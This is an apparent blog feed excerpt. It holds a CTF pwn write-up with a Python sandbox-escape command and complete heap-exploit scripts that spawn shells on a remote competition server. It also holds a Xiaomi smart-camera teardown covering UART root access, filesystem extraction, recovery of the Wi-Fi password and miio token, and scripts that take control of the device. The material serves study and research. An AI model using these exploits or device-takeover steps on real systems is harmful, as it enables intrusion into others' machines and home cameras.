    <content type="html"><![CDATA[<h2 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h2><p>题目给了一大堆文件，先nc上测一下，直接enter可以看到返回的错误信息，知道远程服务器为server.py<br>然后把下载下来的文件解压，搜索server.py ，查看可知</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/1597978442882.png" class="lozad"><br>python input()的时候沙箱逃逸，直接<strong>import</strong>(‘os’).system(“cat /home/ctf/flag”) ,获取到flag</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/1597978742005.png" class="lozad"></p><h2 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h2><p>申请堆块的时候是用strdup来申请的，strdup是根据输入的字符串长度来申请堆块的，若add(0,0x90,‘aaaa’)，edit的时候则造成溢出。<br>此题没有free功能，利用house of orange 攻击 造成一个free过后的堆块，然后伪造size，通过溢出修改 free过后堆块的fd为chunklist附近区域，然后fastbin attack 申请堆块到chunklist，控制堆块指针，修改chunklist[1]为strdup函数的got表，edit功能修改strdup的got表为printf_got,再利用格式化字符串漏洞泄露libc_addr，最后再次修改strdup_got为system_got,然后申请”/bin/sh”的堆块，即可得到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"pwn"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'101.200.53.148'</span>,<span class="number">12301</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">": "</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------house of orange-------------</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'a'</span>*<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xfe1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x1e</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x70</span>,chr(i)*<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x81</span>,chr(<span class="number">0x20</span>)*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x71</span>,chr(<span class="number">0x21</span>)*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x90</span>,chr(<span class="number">0x22</span>)*<span class="number">0x90</span>) <span class="comment"># fastbin </span></span><br><span class="line"><span class="comment">#----------fastbin attack-----------</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x20</span>)*<span class="number">8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x602128</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,chr(<span class="number">0x23</span>)*<span class="number">0x70</span>+p64(<span class="number">0x81</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,chr(<span class="number">0x24</span>)*<span class="number">0x70</span>+p64(<span class="number">0x81</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------chunklist attack---------</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"e"</span>*<span class="number">0x88</span>+p64(<span class="number">0x6021c0</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x602068</span>)+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(elf.plt[<span class="string">"printf"</span>]))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">"%17$p"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">libc_base = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) <span class="number">-240</span>-libc.sym[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">info(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">sys_addr = libc_base + <span class="number">0x45390</span></span><br><span class="line">info(<span class="string">"sys_addr"</span>,sys_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="https://nocbtm.github.io/imgs/1597995302847.png" class="lozad"></p><h2 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h2><p>off-by-one漏洞，没有show功能，老套路了，布局堆块，溢出修改下一个堆块的size包含多个堆块，然后free，根据unsorted bin的特性使得fastbin里面有残留的main_area地址然后修改后两位字节，有十六分之一的几率为 stdout_addr-0x43，然后fastbin_attack 打_IO_2_1_stdout_,修改io_flags为0xfbad1887即可泄露出libc_addr,再次fastbin_attack 打malloc_hook为onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p=remote(<span class="string">"101.200.53.148"</span>, <span class="number">34521</span>)</span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx:\n'</span>,str(idx))</span><br><span class="line">p.sendlineafter(<span class="string">'len:\n'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'content:\n'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">'c'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">'d'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf0</span>,<span class="string">'e'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xf0</span>,<span class="string">'f'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x300</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'aaa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x130</span>,<span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x88'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line"></span><br><span class="line">info(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line">malloc_hook  = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">io_list_all = libc_base + <span class="number">0x3c54fd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">"\x41"</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>,<span class="string">'\x42'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x68</span>,<span class="string">'\x43'</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">"0"</span>*<span class="number">0x28</span>+<span class="string">'\xe1'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xa0</span>,<span class="string">"3"</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"><span class="comment">#add(8,0xa0,"3"*0x68+p64(0x71)+p64(io_list_all))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>,<span class="string">"\x44"</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x68</span>,<span class="string">"a"</span>*<span class="number">0x13</span>+p64(libc_base + one[<span class="number">2</span>]))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"please input your token:"</span>,<span class="string">'icq700049c29f86f68a9b934524cf619'</span>)</span><br><span class="line">p.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;babyjsc&quot;&gt;&lt;a href=&quot;#babyjsc&quot; class=&quot;headerlink&quot; title=&quot;babyjsc&quot;&gt;&lt;/a&gt;babyjsc&lt;/h2&gt;&lt;p&gt;题目给了一大堆文件，先nc上测一下，直接enter可以看到返回的错误信息，知道远程服务器为serve
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>米家小白智能摄像头分析</title>
    <link href="https://nocbtm.github.io/2020/07/21/%E7%B1%B3%E5%AE%B6%E5%B0%8F%E7%99%BD%E6%99%BA%E8%83%BD%E6%91%84%E5%83%8F%E5%A4%B4%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/07/21/米家小白智能摄像头分析/</id>
    <published>2020-07-21T11:10:45.000Z</published>
    <updated>2020-09-03T08:08:34.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="大致分析"><a href="#大致分析" class="headerlink" title="大致分析"></a>大致分析</h2><p>拿到摄像头第一步，拆机，看看有没有uart调试口，找一下flash芯片</p><p>小米做的是真的好，不太好拆，可参考硬核拆解</p><p><a href="https://www.bilibili.com/video/BV1d4411G7vu?t=64" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1d4411G7vu?t=64</a></p><p><a href="http://www.eepw.com.cn/article/201608/295287.htm" target="_blank" rel="noopener">http://www.eepw.com.cn/article/201608/295287.htm</a></p><p>拆完可以看到，这么大的NOR Flash，一般的编程器提取不了，需要更专业的设备。</p><p><img alt="image-20200807110220255" data-src="https://nocbtm.github.io/imgs/image-20200807110220255.png" class="lozad"></p><p>uart调试口一般都在flash的附近，仔细观看。正面没有，看看反面</p><p>这里有一个坑点，有两个Rx，Tx口。经过测试如下已经焊接上的口是真正的，而另一个接上没反应。</p><p><img alt="image-20200807111406761" data-src="https://nocbtm.github.io/imgs/image-20200807111406761.png" class="lozad"></p><p>用SecureCRT接上，波特率选择115200</p><p><img alt="image-20200807133925437" data-src="https://nocbtm.github.io/imgs/image-20200807133925437.png" class="lozad"></p><p>连上之后，没有做用户认证，直接就进来了。看了下开启的端口，有些怪异的地方</p><p>23端口运行着 linuxrc ，这应该是防止开启telnetd服务吧</p><p>而且没有开启554端口的rtsp服务来传输视频，可能用的别的服务吧</p><p><img alt="image-20200807122344393" data-src="https://nocbtm.github.io/imgs/image-20200807122344393.png" class="lozad"></p><p>百度了一下运行的程序</p><p>其中24883端口的<code>pulseaudio</code>是一个声音服务器，用来传输声音的</p><p>摄像头内网1883端口的<code>mosquitto</code>是一款实现了消息推送协议 MQTT v3.1 的开源消息代理软件，用来传输监控视频的</p><p>而且他传输视频不像普通摄像头那么简单，我把他进程杀的差不多了，手机还能看到监控视频</p><p>而54321端口运行的是小米的miio协议，可参考<a href="https://github.com/OpenMiHome/mihome-binary-protocol/blob/master/doc/PROTOCOL.md" target="_blank" rel="noopener">https://github.com/OpenMiHome/mihome-binary-protocol/blob/master/doc/PROTOCOL.md</a></p><p><img alt="image-20200807140936533" data-src="https://nocbtm.github.io/imgs/image-20200807140936533.png" class="lozad"></p><p>针对这个端口python已经有攻击的库了，可参考<a href="https://github.com/rytilahti/python-miio，" target="_blank" rel="noopener">https://github.com/rytilahti/python-miio，</a></p><p><img alt="image-20200807142959137" data-src="https://nocbtm.github.io/imgs/image-20200807142959137.png" class="lozad"></p><p><img alt="image-20200807142031135" data-src="https://nocbtm.github.io/imgs/image-20200807142031135.png" class="lozad"></p><p>难受的是现在还不支持小白摄像头，只能自己分析一下了</p><h2 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h2><p>可以看到我们想要分析的程序在 ./usr/bin/目录下</p><p><img alt="image-20200807144200666" data-src="https://nocbtm.github.io/imgs/image-20200807144200666.png" class="lozad"></p><p>busybox刚好自带httpd服务，默认是不开器的，我们把它打开，用来传输文件</p><p>把 ./usr 目录 和 ./lib 目录都压缩一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">busybox httpd</span><br><span class="line">tar -zcvf usr.tar.gz ./usr</span><br><span class="line">tar -zcvf lib.tar.gz ./lib</span><br></pre></td></tr></table></figure><p>然后wget下来，进行解压  <code>tar -zxvf usr.tar.gz</code></p><p><img alt="image-20200807145210801" data-src="https://nocbtm.github.io/imgs/image-20200807145210801.png" class="lozad"></p><h2 id="qemu模拟"><a href="#qemu模拟" class="headerlink" title="qemu模拟"></a>qemu模拟</h2><p>找到了摄像头的初始化脚本，可以看到程序的启动方式<code>/usr/bin/mosquitto -c /etc/mosquitto/mosquitto.conf -d</code></p><p><code>/usr/bin/miio_client -D</code></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/image-20200807145919673.png" class="lozad"></p><p>使用qemu模拟，先把mosquitt跑起来，再跑 miio_client</p><p><img alt="image-20200807150954939" data-src="https://nocbtm.github.io/imgs/image-20200807150954939.png" class="lozad"></p><p><img alt="image-20200807151142230" data-src="https://nocbtm.github.io/imgs/image-20200807151142230.png" class="lozad"></p><p>然后向54321发送udp数据，可以看到成功接收到</p><p><img alt="image-20200807155050870" data-src="https://nocbtm.github.io/imgs/image-20200807155050870.png" class="lozad"></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>根据一些字符串可以快速定位到代码</p><p><img alt="image-20200807155620286" data-src="https://nocbtm.github.io/imgs/image-20200807155620286.png" class="lozad"></p><p>可以分析出传输的数据是json格式的，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;method&quot;:&quot;get_prop&quot;,&quot;params&quot;:[&quot;night_state&quot;,&quot;night_beg_time&quot;,&quot;night_end_time&quot;]&#125;</span><br></pre></td></tr></table></figure><p>而且需要认证ID</p><p><img alt="image-20200807160052510" data-src="https://nocbtm.github.io/imgs/image-20200807160052510.png" class="lozad"></p><p>可以看到有很多配置<code>method</code></p><p><img alt="image-20200807155838345" data-src="https://nocbtm.github.io/imgs/image-20200807155838345.png" class="lozad"></p><p>进入miIo.config_router方法可以看到接收的数据都是用<code>json_object_object_add</code>函数来匹配接收的，</p><p>代码写的很好，没有发现什么栈溢出漏洞</p><p><img alt="image-20200807163002510" data-src="https://nocbtm.github.io/imgs/image-20200807163002510.png" class="lozad"></p><p>但还是能分析出来一些敏感信息，wifi的连接密码</p><p><img alt="image-20200807165114652" data-src="https://nocbtm.github.io/imgs/image-20200807165114652.png" class="lozad"></p><p>miio的配置文件</p><p><img alt="image-20200807164907414" data-src="https://nocbtm.github.io/imgs/image-20200807164907414.png" class="lozad"></p><p>miio的验证token</p><p><img alt="image-20200807165257875" data-src="https://nocbtm.github.io/imgs/image-20200807165257875.png" class="lozad"></p><p>通过这个token就可以控制摄像头，先安装python-miio方便利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install python-miio</span><br></pre></td></tr></table></figure><p>目前这个库还不支持这款摄像头，需要自己再改写一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> protocol <span class="keyword">import</span> Message</span><br><span class="line"></span><br><span class="line">helobytes=bytes.fromhex(<span class="string">'21310020ffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>)</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">s.sendto(helobytes,(<span class="string">'192.168.137.159'</span>,<span class="number">54321</span>))<span class="comment">#插座ip，端口54321</span></span><br><span class="line">data,addr=s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">m=Message.parse(data)</span><br><span class="line">tok=codecs.encode(m.checksum,<span class="string">'hex'</span>)</span><br><span class="line">print(m)</span><br><span class="line">print(tok)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> miio</span><br><span class="line">ip=<span class="string">'192.168.137.159'</span></span><br><span class="line">token=<span class="string">'6ECM1qxqXi0VkF4t'</span></span><br><span class="line">s = miio.device.Device(ip=ip, token=token)</span><br><span class="line">s.info()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">from</span> miio.chuangmi_plug <span class="keyword">import</span> ChuangmiPlug</span><br><span class="line">ip=<span class="string">'192.168.137.159'</span></span><br><span class="line">token=<span class="string">'6ECM1qxqXi0VkF4t'</span></span><br><span class="line">d = ChuangmiPlug(ip=ip, token=token)</span><br><span class="line"></span><br><span class="line">x=d.status() <span class="comment"># 给出设备的状态</span></span><br><span class="line"><span class="comment"># x: &lt;ChuangmiPlugStatus power=True, usb_power=None, temperature=46, load_power=None, wifi_led=None&gt;</span></span><br><span class="line"><span class="comment"># x.power = True</span></span><br><span class="line">x=d.info()</span><br><span class="line"><span class="comment"># type(z)</span></span><br><span class="line"><span class="comment"># miio.device.DeviceInfo</span></span><br><span class="line"><span class="comment"># print(z)</span></span><br><span class="line"><span class="comment"># chuangmi.plug.m3 v1.3.8_0002 (04:CF:8C:5F:**:**) @ 192.168.1.20 - token: *****</span></span><br><span class="line">x=d.off()</span><br><span class="line"><span class="comment"># x = ['ok'] 则 控制成功</span></span><br><span class="line">x=d.on()</span><br><span class="line"><span class="comment"># x = ['ok'] 则 控制成功</span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" 